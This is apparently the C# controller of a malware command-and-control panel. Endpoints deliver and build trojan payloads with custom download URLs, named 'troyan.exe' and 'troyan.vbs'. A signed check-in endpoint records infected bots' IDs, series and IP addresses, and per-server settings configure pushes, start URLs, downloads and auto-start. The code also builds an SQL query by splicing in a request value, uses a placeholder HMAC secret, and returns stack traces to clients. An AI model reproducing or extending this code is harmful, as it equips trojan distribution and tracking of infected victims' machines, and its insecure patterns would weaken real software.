using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using cp.Code;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Data.SqlClient;
using Microsoft.VisualBasic.CompilerServices;
using model;

namespace cp.Controllers;

[Route("")]
public class CpController : Controller
{
    private static string RootDataDir => ServerModelLoader.RootDataStatic;

    private const string SecretKey = "YourSecretKeyHere"; // Secret key for hashing
    
    private readonly string _connectionString;



    public static Dictionary<string, string> AdminServers()
    {
        var result = new Dictionary<string, string>();
        var dirs = Directory.GetDirectories(RootDataDir).ToArray();
        foreach (var dir in dirs)
        {
            var password = "password";
            result.Add(dir, Path.GetFileName(dir));
        }
        return result;
    }
    
    private readonly ServerService _serverService;

    public CpController(ServerService serverService,IConfiguration configuration)
    {
        _serverService = serverService;
        _connectionString = configuration.GetConnectionString("Default");
    }
    
    private string Server(string server)
    {
        if (Request.Host.Host == "localhost")
            return ServerModelLoader.ipFromHost(ServerModelLoader.DomainControllerStatic);
        if (!string.IsNullOrEmpty(server))
            return ServerModelLoader.ipFromHost(server);
        return ServerModelLoader.ipFromHost(Request.Host.Host);
    }
    
    [HttpGet("{server}/Stats")]
    public async Task<IActionResult> ViewStats(string server)
    {
        server = Server(server);
        var stats = new List<DailyServerSerieStats>();

        try
        {
            using (var connection = new SqlConnection(_connectionString))
            {
                await connection.OpenAsync();
                using (var command = new SqlCommand($"SELECT TOP (1000) [Date], [server], [Serie], [UniqueIDCount] FROM [hephaestus].[dbo].[DailyServerSerieStatsView] where server = '{server}' order by date,serie desc", connection))
                {
                    using (var reader = await command.ExecuteReaderAsync())
                    {
                        while (await reader.ReadAsync())
                        {
                            var stat = new DailyServerSerieStats
                            {
                                Date = reader.GetDateTime(reader.GetOrdinal("Date")),
                                Server = reader.GetString(reader.GetOrdinal("server")),
                                Serie = reader.GetString(reader.GetOrdinal("Serie")),
                                UniqueIDCount = reader.GetInt32(reader.GetOrdinal("UniqueIDCount"))
                            };
                            stats.Add(stat);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Log the exception (ex) here
            return StatusCode(500, $"Internal server error: {ex.Message}");
        }

        return View("BotLog", stats);
    }
    
    
    public IActionResult Index()
    {
        var server = Server("");
        return IndexWithServer(server);
    }

    [HttpGet]
    [Route("{server}")]
    public IActionResult IndexWithServer(string server)
    {
        if (server == "favicon.ico")
            return NotFound();
        try
        {
            server = Server(server);
            var serverResult = _serverService.GetServer(server);
            if (serverResult.ServerModel == null)
            {
                return IndexAdmin();
            }
            return View("Index", serverResult.ServerModel);
        }
        catch (Exception e)
        {
            return View("Index", new ServerModel() {Server = server, Result = e.Message + "\r\n" + e.StackTrace });
        }
    }
    
    [HttpGet("{server}/GetIcon")]
    public IActionResult GetIcon(string server)
    {
        try
        {
            server = Server(server);
            if (!System.IO.File.Exists(_serverService.GetIcon(server)))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIcon(server));
            Response.Headers.Add("Content-Type", "image/x-icon");
            return File(fileBytes, "image/x-icon");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    [HttpGet("{server}/GetExe")]
    public IActionResult GetExe(string server)
    {
        try
        {
            server = Server(server);
            var exeFile = _serverService.GetExe(server);
            if (!System.IO.File.Exists(exeFile))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetExe(server));
            Response.Headers.Add("Content-Type", "application/octet-stream");
            return File(fileBytes, "application/octet-stream", "troyan.exe");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    [HttpGet("{server}/BuildExe")]
    public IActionResult BuildExe(string server, string exeUrl)
    {
        try
        {
            server = Server(server);
            if (!System.IO.File.Exists(_serverService.GetExe(server))) 
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.BuildExe(server, exeUrl));
            Response.Headers.Add("Content-Type", "application/octet-stream");
            return File(fileBytes, "application/octet-stream", "troyan_spec.exe");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }
    
        
    [HttpGet("{server}/GetVbs")]
    public IActionResult GetVbs(string server)
    {
        try
        {
            server = Server(server);
            if (!System.IO.File.Exists(_serverService.GetVbs(server)))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetVbs(server));
            Response.Headers.Add("Content-Type", "text/vbscript");
            return File(fileBytes, "application/octet-stream", "troyan.vbs");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }
    
    [HttpGet("{server}/BuildVbs")]
    public IActionResult BuildVbs(string server, string exeUrl)
    {
        try
        {
            server = Server(server);
            if (!System.IO.File.Exists(_serverService.GetVbs(server))) 
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.BuildExe(server, exeUrl));
            Response.Headers.Add("Content-Type", "application/octet-stream");
            return File(fileBytes, "application/octet-stream", "troyan_spec.vbs");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }
    
    [HttpPost()]
    public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
    {
        return IndexWithServer(updatedModel, action, iconFile, newEmbeddings, newFront);
    }

    [HttpPost("{server}", Name = "Index")]
    public IActionResult IndexWithServer(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
    {
        if (updatedModel.AdminServers != null)
        {
            return IndexAdmin(updatedModel);
        }
        try
        {
            var existingModel = _serverService.GetServer(updatedModel.Server).ServerModel;
            if (existingModel == null)
            {
                return NotFound();
            }

            //embeddings
            if (newEmbeddings != null && newEmbeddings.Count > 0)
            {
                foreach (var file in newEmbeddings)
                {
                    var filePath = _serverService.GetEmbedding(updatedModel.Server, file.FileName);
                    if (!Directory.Exists(_serverService.EmbeddingsDir(updatedModel.Server)))
                        Directory.CreateDirectory(_serverService.EmbeddingsDir(updatedModel.Server));
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Embeddings.Add(file.FileName);
                }
            }

            var toDeleteEmbeddings = existingModel.Embeddings.Where(a => !updatedModel.Embeddings.Contains(a));
            foreach (var file in toDeleteEmbeddings)
                _serverService.DeleteEmbedding(updatedModel.Server, file);

            //front
            if (newFront != null && newFront.Count > 0)
            {
                foreach (var file in newFront)
                {
                    var filePath = _serverService.GetFront(updatedModel.Server, file.FileName);
                    if (!Directory.Exists(_serverService.FrontDir(updatedModel.Server)))
                        Directory.CreateDirectory(_serverService.FrontDir(updatedModel.Server));
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Front.Add(file.FileName);
                }
            }

            var toDeleteFront = existingModel.Front.Where(a => !updatedModel.Front.Contains(a));
            foreach (var file in toDeleteFront)
                _serverService.DeleteFront(updatedModel.Server, file);

            //icon
            if (iconFile != null && iconFile.Length > 0)
            {
                var filePath = _serverService.GetIcon(updatedModel.Server);

                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    iconFile.CopyTo(stream);
                }
            }

            updatedModel.Pushes = updatedModel.Pushes
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
            
            updatedModel.StartUrls = updatedModel.StartUrls
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
            
            updatedModel.StartDownloads= updatedModel.StartDownloads
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();

            //model
            existingModel.Server = updatedModel.Server;
            existingModel.Alias = updatedModel.Alias;
            existingModel.StrahServer = updatedModel.StrahServer;
            existingModel.Login = updatedModel.Login;
            existingModel.Password = updatedModel.Password;
            existingModel.Track = updatedModel.Track;
            existingModel.TrackSerie = updatedModel.TrackSerie;
            existingModel.AutoStart = updatedModel.AutoStart;
            existingModel.AutoUpdate = updatedModel.AutoUpdate;
            existingModel.Pushes = updatedModel.Pushes;
            existingModel.StartUrls = updatedModel.StartUrls;
            existingModel.StartDownloads = updatedModel.StartDownloads;
            existingModel.Front = updatedModel.Front;
            existingModel.ExtractIconFromFront = updatedModel.ExtractIconFromFront;
            existingModel.Embeddings = updatedModel.Embeddings;
            existingModel.Domains = updatedModel.IpDomains.Values.ToList();
            
            if (!ContainsUniqueValues(existingModel.Domains))
            {
                return View("Index", new ServerModel() {Server = updatedModel.Server, Result = "Домены должны быть уникальными" });
            }

            //service
            var result = _serverService.PostServer(existingModel.Server, existingModel, action);

            existingModel.Result = result;
            return View("Index", existingModel);
        }
        catch (Exception e)
        {
            return View("Index", new ServerModel() {Server = updatedModel.Server, Result = e.Message + "\r\n" + e.StackTrace });
        }
    }
    
    public static bool ContainsUniqueValues(List<string> strings)
    {
        HashSet<string> uniqueStrings = new HashSet<string>();

        foreach (var str in strings)
        {
            if (!uniqueStrings.Add(str))
            {
                // If Add returns false, the string was already in the HashSet
                return false;
            }
        }
        return true;
    }

    
    
    private IActionResult IndexAdmin()
    {
        return View("admin", new ServerModel(){AdminServers = AdminServers()});
    }

    private IActionResult IndexAdmin(ServerModel updatedModel)
    {
        if (updatedModel.AdminPassword != System.Environment.GetEnvironmentVariable("SuperPassword", EnvironmentVariableTarget.Machine))
        {
            return Unauthorized();
        }

        var was = AdminServers();

        var toDelete = was.Where(a => !updatedModel.AdminServers.ContainsKey(a.Key));
        
        var toAdd = updatedModel.AdminServers.Where(a => !was.ContainsKey(a.Key));


        
        foreach (var server in toDelete)
        {
            ServerUtils.DeleteFolderRecursive(server.Key);
        }
        
        foreach (var server in toAdd)
        {
            _serverService.GetServer(server.Key, true, server.Value);
        }
        
        return IndexAdmin();
    }
    
    [HttpPost("{server}/upsert")]
    [Consumes("application/json")]
    [Produces("application/json")]
    public async Task<IActionResult> UpsertBotLog(
        string server,
        [FromHeader(Name = "X-Signature")] string xSignature,
        [FromBody] BotLogRequest request)
    {
        // Serialize the request object to JSON
        var jsonOptions = new JsonSerializerOptions
        {
            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
            PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
            WriteIndented = false // Ensure compact JSON
        };

        string jsonBody = JsonSerializer.Serialize(request, jsonOptions);

        if (!ValidateHash(jsonBody, xSignature, SecretKey))
        {
            return Unauthorized("Invalid signature.");
        }

        string ipAddress = "unknown";
        try
        {
            ipAddress = HttpContext.Connection.RemoteIpAddress?.ToString();
        }
        catch (Exception e)
        {
            ipAddress = "unknown";
        }

        if (Request.Headers.ContainsKey("HTTP_X_FORWARDED_FOR"))
        {
            var forwardedFor = Request.Headers["HTTP_X_FORWARDED_FOR"].First();

            ipAddress = String.IsNullOrWhiteSpace(forwardedFor)
                ? ipAddress
                : forwardedFor.Split(',').Select(s => s.Trim()).FirstOrDefault();
        }


        if (string.IsNullOrWhiteSpace(ipAddress))
        {
            return BadRequest("IP address not found.");
        }

        if (string.IsNullOrWhiteSpace(server))
        {
            return BadRequest("Server address not found.");
        }

        try
        {
            using (var connection = new SqlConnection(_connectionString))
            {
                await connection.OpenAsync();

                using (var command = new SqlCommand("dbo.UpsertBotLog", connection))
                {
                    command.CommandType = CommandType.StoredProcedure;

                    command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
                    command.Parameters.AddWithValue("@ip", ipAddress);
                    command.Parameters.AddWithValue("@id", request.Id);
                    command.Parameters.AddWithValue("@serie", request.Serie ?? (object)DBNull.Value);
                    command.Parameters.AddWithValue("@number", request.Number ?? (object)DBNull.Value);

                    await command.ExecuteNonQueryAsync();
                }
            }

            return Ok("{}");
        }
        catch (Exception ex)
        {
            // Log the exception (ex) here
            return StatusCode(500, $"Internal server error: {ex.Message}");
        }
    }

    private bool ValidateHash(string data, string hash, string key)
    {
        using (var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(key)))
        {
            var computedHash = Convert.ToBase64String(hmac.ComputeHash(Encoding.UTF8.GetBytes(data)));
            // Debugging: Print the computed hash
            Console.WriteLine($"Computed hash on server: {computedHash}");
            return computedHash.Equals(hash);
        }
    }
}